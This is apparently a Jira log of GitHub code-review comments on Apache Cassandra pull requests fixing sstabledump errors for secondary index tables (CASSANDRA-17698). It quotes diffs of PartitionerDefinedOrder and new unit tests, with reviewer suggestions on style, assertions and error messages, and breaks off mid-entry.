+        if (SecondaryIndexManager.isIndexColumnFamily(desc.cfname))
+        {
+            String index = SecondaryIndexManager.getIndexName(desc.cfname);
+            IndexMetadata indexMetadata =  IndexMetadata.fromSchemaMetadata(index, IndexMetadata.Kind.CUSTOM, null);

Review Comment:
   I think that the kind of index doesn't have consequences for the sstable export, and I don't see a way to get the kind of index from the sstable. So it's probably ok to leave it as it is but, since it's not strictly correct, I'd leave a brief comment on the code about it.



;18/Jan/23 12:10;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073456047


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +102,125 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+        
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is  ReversedType
+        differentBaseTypeValidation(ReversedType.getInstance(Int32Type.instance));
+        // PartitionerDefinedOrder's base type is  CollectionType
+        differentBaseTypeValidation(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertFalse(result);
+            }
+            else
+            {
+                // ByteOrderedPartitioner.instance and OrderPreservingPartitioner.instance's partitionOrdering will not be PartitionerDefinedOrder
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertTrue(result);
+            }
+
+        }
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+    
+    @Test
+    public void testParsePartitionerOrderWithErrorFormat() 
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                // only Murmur3Partitioner and RandomPartitioner's partitionOrdering() are instanceof PartitionerDefinedOrder
+                String msgPartitioner = partitioner instanceof Murmur3Partitioner ? ""Murmur3Partitioner"" : ""RandomPartitioner"";
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner,
+                String tmpStr1 =  type.toString().replace(')', ',');
+                try
+                {
+                    TypeParser.parse(tmpStr1);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();

Review Comment:
   Unused var, the message is taken from the exception again in the line right below.



;18/Jan/23 12:12;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073457163


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +102,125 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+        
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is  ReversedType
+        differentBaseTypeValidation(ReversedType.getInstance(Int32Type.instance));
+        // PartitionerDefinedOrder's base type is  CollectionType
+        differentBaseTypeValidation(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertFalse(result);
+            }
+            else
+            {
+                // ByteOrderedPartitioner.instance and OrderPreservingPartitioner.instance's partitionOrdering will not be PartitionerDefinedOrder
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertTrue(result);
+            }
+
+        }
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+    
+    @Test
+    public void testParsePartitionerOrderWithErrorFormat() 
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                // only Murmur3Partitioner and RandomPartitioner's partitionOrdering() are instanceof PartitionerDefinedOrder
+                String msgPartitioner = partitioner instanceof Murmur3Partitioner ? ""Murmur3Partitioner"" : ""RandomPartitioner"";
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner,
+                String tmpStr1 =  type.toString().replace(')', ',');
+                try
+                {
+                    TypeParser.parse(tmpStr1);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "",: for msg unexpected character ','""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr2 =  type.toString().replace(')', '>');
+                try
+                {
+                    TypeParser.parse(tmpStr2);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();
+                    System.out.println(tmp);
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "">: for msg unexpected character '>'""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr3 =  type.toString().replace(')', ':');
+                try
+                {
+                    TypeParser.parse(tmpStr3);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();
+                    System.out.println(tmp);

Review Comment:
   I'd remove the `println`



;18/Jan/23 12:13;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073457577


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +102,125 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+        
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is  ReversedType
+        differentBaseTypeValidation(ReversedType.getInstance(Int32Type.instance));
+        // PartitionerDefinedOrder's base type is  CollectionType
+        differentBaseTypeValidation(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertFalse(result);
+            }
+            else
+            {
+                // ByteOrderedPartitioner.instance and OrderPreservingPartitioner.instance's partitionOrdering will not be PartitionerDefinedOrder
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertTrue(result);
+            }
+
+        }
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+    
+    @Test
+    public void testParsePartitionerOrderWithErrorFormat() 
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                // only Murmur3Partitioner and RandomPartitioner's partitionOrdering() are instanceof PartitionerDefinedOrder
+                String msgPartitioner = partitioner instanceof Murmur3Partitioner ? ""Murmur3Partitioner"" : ""RandomPartitioner"";
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner,
+                String tmpStr1 =  type.toString().replace(')', ',');
+                try
+                {
+                    TypeParser.parse(tmpStr1);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "",: for msg unexpected character ','""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr2 =  type.toString().replace(')', '>');
+                try
+                {
+                    TypeParser.parse(tmpStr2);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();
+                    System.out.println(tmp);
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "">: for msg unexpected character '>'""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr3 =  type.toString().replace(')', ':');
+                try
+                {
+                    TypeParser.parse(tmpStr3);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();
+                    System.out.println(tmp);
+                    assertTrue(t.getCause().getMessage().contains(""Unable to find abstract-type class 'org.apache.cassandra.db.marshal.'""));
+                }
+            }
+        }
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+
+    private void differentBaseTypeValidation(AbstractType baseType)
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(baseType);
+            }
+            System.out.println(type.toString());

Review Comment:
   I'd remove the `println`



;18/Jan/23 12:13;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073459195


##########
test/unit/org/apache/cassandra/db/marshal/PartitionerDefinedOrderTest.java:
##########
@@ -0,0 +1,80 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.db.marshal;
+
+import org.junit.Test;
+
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.utils.ByteBufferUtil;
+
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class PartitionerDefinedOrderTest
+{
+    private String key = ""key"";
+    private AbstractType type = UTF8Type.instance;

Review Comment:
   ```suggestion
       private static final String key = ""key"";
       private static final AbstractType<?> type = UTF8Type.instance;
   ```



;18/Jan/23 12:15;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073459605


##########
test/unit/org/apache/cassandra/db/marshal/PartitionerDefinedOrderTest.java:
##########
@@ -0,0 +1,80 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.db.marshal;
+
+import org.junit.Test;
+
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.utils.ByteBufferUtil;
+
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class PartitionerDefinedOrderTest
+{
+    private String key = ""key"";
+    private AbstractType type = UTF8Type.instance;
+    
+    @Test
+    public void testToJsonStringWithBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)

Review Comment:
   ```suggestion
               if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
   ```



##########
test/unit/org/apache/cassandra/db/marshal/PartitionerDefinedOrderTest.java:
##########
@@ -0,0 +1,80 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.db.marshal;
+
+import org.junit.Test;
+
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.utils.ByteBufferUtil;
+
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class PartitionerDefinedOrderTest
+{
+    private String key = ""key"";
+    private AbstractType type = UTF8Type.instance;
+    
+    @Test
+    public void testToJsonStringWithBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder partitionerDefinedOrder = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+                String jsonString = partitionerDefinedOrder.withBaseType(type).toJSONString(ByteBufferUtil.bytes(key), 4);
+                assertTrue(jsonString.contains(key));
+            }
+        }
+    }
+    
+    @Test
+    public void testToJsonStringWithOutBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)

Review Comment:
   ```suggestion
               if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
   ```



;18/Jan/23 12:16;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073460600


##########
test/unit/org/apache/cassandra/db/marshal/PartitionerDefinedOrderTest.java:
##########
@@ -0,0 +1,80 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.db.marshal;
+
+import org.junit.Test;
+
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.utils.ByteBufferUtil;
+
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class PartitionerDefinedOrderTest
+{
+    private String key = ""key"";
+    private AbstractType type = UTF8Type.instance;
+    
+    @Test
+    public void testToJsonStringWithBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder partitionerDefinedOrder = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+                String jsonString = partitionerDefinedOrder.withBaseType(type).toJSONString(ByteBufferUtil.bytes(key), 4);
+                assertTrue(jsonString.contains(key));
+            }
+        }
+    }
+    
+    @Test
+    public void testToJsonStringWithOutBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder partitionerDefinedOrder = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+                assertEquals(null, partitionerDefinedOrder.getBaseType());

Review Comment:
   ```suggestion
                   assertNull(partitionerDefinedOrder.getBaseType());
   ```



;18/Jan/23 12:17;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073465092


##########
test/unit/org/apache/cassandra/db/marshal/PartitionerDefinedOrderTest.java:
##########
@@ -0,0 +1,80 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.db.marshal;
+
+import org.junit.Test;
+
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.utils.ByteBufferUtil;
+
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class PartitionerDefinedOrderTest
+{
+    private String key = ""key"";
+    private AbstractType type = UTF8Type.instance;
+    
+    @Test
+    public void testToJsonStringWithBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder partitionerDefinedOrder = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+                String jsonString = partitionerDefinedOrder.withBaseType(type).toJSONString(ByteBufferUtil.bytes(key), 4);
+                assertTrue(jsonString.contains(key));
+            }
+        }
+    }
+    
+    @Test
+    public void testToJsonStringWithOutBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder partitionerDefinedOrder = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+                assertEquals(null, partitionerDefinedOrder.getBaseType());
+                try
+                {
+                    partitionerDefinedOrder.toJSONString(ByteBufferUtil.bytes(key), 4);
+                    fail();
+                }
+                catch (Throwable throwable)
+                {
+                    assertTrue(throwable.getMessage().contains(""The base type is null""));
+                }

Review Comment:
   Nit: we can simplify a bit with:
   ```java
   Assertions.assertThatThrownBy(() -> partitionerDefinedOrder.toJSONString(ByteBufferUtil.bytes(key), 4))
             .hasMessageContaining(""The base type is null"");
   ```



;18/Jan/23 12:21;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073469417


##########
test/unit/org/apache/cassandra/db/marshal/PartitionerDefinedOrderTest.java:
##########
@@ -0,0 +1,80 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.db.marshal;
+
+import org.junit.Test;
+
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.utils.ByteBufferUtil;
+
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
+public class PartitionerDefinedOrderTest
+{
+    private String key = ""key"";
+    private AbstractType type = UTF8Type.instance;
+    
+    @Test
+    public void testToJsonStringWithBaseType()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            if(partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder partitionerDefinedOrder = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+                String jsonString = partitionerDefinedOrder.withBaseType(type).toJSONString(ByteBufferUtil.bytes(key), 4);

Review Comment:
   ```suggestion
                   String jsonString = partitionerDefinedOrder.withBaseType(type).toJSONString(UTF8Type.instance.decompose(key), 4);
   ```



;18/Jan/23 12:26;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073478107


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   Perhaps we should leave a comment mentioning this ticket, or extend the error message, so anyone hitting this know what's going on. That way, anyone trying to export a sstable that wasn't generated with the fixed version of C* will be aware of the situation. Alternatively, I wonder if it would make sense to print the serialized value of the clustering instead of failing. @smiklosovic @blambov wdyt?



;18/Jan/23 12:35;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073592078


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   +1



;18/Jan/23 14:16;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073598545


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   print serialized value seems not easy, for in PartitionerDefinedOrder class, lack of really data type. When  using fixed code to export older sstable. 



;18/Jan/23 14:19;githubbot;600","Maxwell-Guo opened a new pull request, #2118:
URL: https://github.com/apache/cassandra/pull/2118

   sstabledump errors when dumping data from index  for CASSANDRA-17698
   
   ```
   
   patch by <maxwellguo>; reviewed by <Reviewers> for CASSANDRA-17698
   
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17698)
   
   


;30/Jan/23 05:14;githubbot;600","adelapena commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093074349


##########
src/java/org/apache/cassandra/db/marshal/AbstractCompositeType.java:
##########
@@ -266,6 +266,7 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, ProtocolVersion protocolVersion)
     {
+        //TODO suport toJSONString for AbstractCompositeType

Review Comment:
   ```suggestion
           // TODO: suport toJSONString (CASSANDRA-18177)
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
